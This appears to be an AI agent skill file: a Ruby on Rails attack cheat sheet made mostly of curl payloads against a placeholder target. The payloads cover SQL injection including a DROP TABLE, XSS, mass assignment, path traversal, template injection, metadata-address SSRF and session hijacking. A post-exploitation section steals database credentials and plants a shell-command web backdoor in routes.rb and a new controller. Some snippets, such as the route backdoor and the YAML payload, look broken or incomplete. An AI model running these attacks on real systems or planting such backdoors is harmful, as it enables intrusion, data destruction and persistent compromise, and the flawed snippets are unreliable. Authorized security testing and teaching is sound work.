---
name: rails
description: Ruby on Rails framework security testing - common vulnerabilities, misconfigurations, and Rails-specific attacks
---

# Ruby on Rails Security

## Fingerprinting

### Identify Rails
```bash
# Check headers
curl -I https://target.com | grep -i "x-powered-by\|x-runtime\|x-request-id"

# Check for Rails markers
curl -s https://target.com | grep -i "csrf-token\|rails"

# Check for Rails error page
curl -s https://target.com/nonexistent | grep -i "routing error\|action controller"

# Check for Rails assets
curl -s https://target.com/assets/application.js
curl -s https://target.com/assets/application.css
```

### Version Detection
```bash
# Check for version in error page (if Rails.env.development?)
curl -s https://target.com/nonexistent | grep -o "Rails [0-9.]*"

# Check for version in meta tags
curl -s https://target.com | grep -o 'content="Rails [0-9.]*"'

# Check Gemfile.lock (if exposed)
curl -s https://target.com/Gemfile.lock | grep -A 1 "rails ("
```

## Common Vulnerabilities

### 1. Debug Mode Enabled
```bash
# Check for Rails console
curl -s https://target.com/rails/info/routes
curl -s https://target.com/rails/info/properties
curl -s https://target.com/rails/mailers

# Trigger error page
curl -s https://target.com/nonexistent

# Extract sensitive information
curl -s https://target.com/nonexistent | grep -iE "(database|password|secret|api_key)"
```

### 2. Mass Assignment
```bash
# Test for mass assignment (Rails < 4)
curl -X POST https://target.com/users \
  -d "user[name]=attacker&user[email]=attacker@evil.com&user[admin]=true"

# Test for strong parameters bypass (Rails 4+)
curl -X POST https://target.com/users \
  -H "Content-Type: application/json" \
  -d '{"user": {"name": "attacker", "email": "attacker@evil.com", "admin": true}}'

# Test for nested attributes
curl -X POST https://target.com/users \
  -d "user[name]=attacker&user[profile_attributes][bio]=test&user[profile_attributes][admin]=true"
```

### 3. SQL Injection

**ActiveRecord bypass**
```bash
# Test for raw SQL queries
curl "https://target.com/users?search=admin' OR '1'='1"
curl "https://target.com/users?id=1 UNION SELECT 1,2,3,4,5--"

# Test for where clause injection
curl "https://target.com/users?order=id;DROP TABLE users--"

# Test for find_by_sql injection
curl "https://target.com/users?filter=1' OR 1=1--"

# Test for order clause injection
curl "https://target.com/users?order=id,(SELECT+SLEEP(5))"
```

### 4. Insecure Direct Object References (IDOR)
```bash
# Test for IDOR in RESTful routes
curl https://target.com/users/1
curl https://target.com/users/2
curl https://target.com/users/admin

# Test for IDOR with UUIDs
curl https://target.com/users/550e8400-e29b-41d4-a716-446655440000

# Test for IDOR in nested resources
curl https://target.com/users/1/orders
curl https://target.com/users/2/orders
```

### 5. Cross-Site Scripting (XSS)

**Rails XSS vectors**
```bash
# Test for raw HTML output
curl "https://target.com/search?q=<script>alert(1)</script>"

# Test for html_safe bypass
curl "https://target.com/search?q=<script>alert(1)</script>"

# Test for sanitize bypass
curl "https://target.com/search?q=<img src=x onerror=alert(1)>"
curl "https://target.com/search?q=<svg onload=alert(1)>"
```

### 6. CSRF Token Bypass
```bash
# Check if CSRF protection is enabled
curl -I https://target.com/login | grep -i "csrf"

# Test for CSRF token bypass
curl -X POST https://target.com/users \
  -H "X-CSRF-Token: invalid" \
  -d "user[name]=test"

# Test for CSRF via subdomain
# If target.com has CSRF protection, check if subdomain.target.com can bypass it
```

## Rails-Specific Attacks

### 1. YAML Deserialization (CVE-2013-0156)
```bash
# Test for YAML deserialization
curl -X POST https://target.com/api/parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?><hash><tag type="yaml">--- !ruby/object:Gem::Installer
i: id
</tag></hash>'
```

### 2. XML Parameter Parsing (CVE-2013-0156)
```bash
# Test for XML parameter parsing
curl -X POST https://target.com/users \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?><user><name>attacker</name><admin type="boolean">true</admin></user>'
```

### 3. Dynamic Render Paths (CVE-2016-0752)
```bash
# Test for dynamic render paths
curl "https://target.com/users/1?template=../../../etc/passwd"
curl "https://target.com/users/1?template=../../../app/views/users/show"
```

### 4. Action View Template Injection (CVE-2016-2098)
```bash
# Test for template injection
curl "https://target.com/users/1?template=<%= system('id') %>"
```

### 5. File Disclosure (CVE-2014-0130)
```bash
# Test for file disclosure
curl "https://target.com/users/1.pdf?locale=../../../etc/passwd%00"
```

### 6. Active Storage SSRF (CVE-2020-8165)
```bash
# Test for Active Storage SSRF
curl -X POST https://target.com/uploads \
  -F "file=@test.txt" \
  -F "url=http://169.254.169.254/latest/meta-data/"
```

## Session Management

### 1. Session Fixation
```bash
# Check session cookie
curl -I https://target.com | grep -i "set-cookie"

# Test for session fixation
curl -c cookies.txt https://target.com
# Check if session ID changes after login
```

### 2. Session Hijacking
```bash
# Extract session ID from cookie
curl -I https://target.com | grep -i "set-cookie" | grep -o "_session_id=[^;]*"

# Use session ID in another browser
curl -b "_session_id=extracted_session_id" https://target.com/profile
```

### 3. Cookie Store Vulnerabilities
```bash
# If using cookie store, decode session cookie
echo "session_cookie" | base64 -d

# Check for sensitive data in session
# If secret_key_base is weak, forge session cookie
```

## API Vulnerabilities

### 1. Rails API Mode
```bash
# Check for API endpoints
curl -s https://target.com/api/v1/users
curl -s https://target.com/api/v1/posts

# Test for authentication bypass
curl -H "Authorization: Bearer invalid_token" https://target.com/api/v1/users
```

### 2. Grape API Framework
```bash
# Check for Grape API
curl -s https://target.com/api
curl -s https://target.com/api/swagger_doc

# Test for Grape vulnerabilities
curl "https://target.com/api/users?id=1' OR '1'='1"
```

## Testing Checklist

- [ ] Identify Rails version
- [ ] Check for debug mode
- [ ] Test for mass assignment
- [ ] Test for SQL injection (ActiveRecord bypass)
- [ ] Test for IDOR in RESTful routes
- [ ] Test for XSS (html_safe bypass)
- [ ] Test CSRF protection
- [ ] Test for YAML deserialization (CVE-2013-0156)
- [ ] Test for XML parameter parsing (CVE-2013-0156)
- [ ] Test for dynamic render paths (CVE-2016-0752)
- [ ] Test for template injection (CVE-2016-2098)
- [ ] Test for file disclosure (CVE-2014-0130)
- [ ] Test for Active Storage SSRF (CVE-2020-8165)
- [ ] Test session management
- [ ] Test API vulnerabilities

## Tools

```bash
# Rails vulnerability scanner
# https://github.com/presidentbeef/brakeman

# SQLMap for Rails
sqlmap -u "https://target.com/users?id=1" --dbms=postgresql

# Nuclei templates for Rails
nuclei -u https://target.com -t ~/nuclei-templates/technologies/rails/
nuclei -u https://target.com -t ~/nuclei-templates/cves/2013/CVE-2013-0156.yaml

# Rails exploitation framework
# https://github.com/jvns/rails-exploit-cve-2013-0156
```

## Post-Exploitation

### 1. Extract Database Credentials
```bash
# If you have file read access
cat /var/www/html/config/database.yml

# Example output:
# production:
#   adapter: postgresql
#   database: rails_production
#   username: rails
#   password: secret_password
#   host: localhost
```

### 2. Rails Console Access
```bash
# If you have shell access
cd /var/www/html
rails console production

# In Rails console
User.all
User.find(1).update(admin: true)
```

### 3. Create Backdoor
```bash
# Add backdoor route
echo 'get "/backdoor", to: proc { |env| [200, {}, [`#{params[:cmd]}`]] }' >> /var/www/html/config/routes.rb

# Add backdoor controller
cat > /var/www/html/app/controllers/backdoor_controller.rb << 'EOF'
class BackdoorController < ApplicationController
  skip_before_action :verify_authenticity_token
  
  def index
    render plain: `#{params[:cmd]}`
  end
end
EOF

# Access backdoor
curl "https://target.com/backdoor?cmd=id"
```
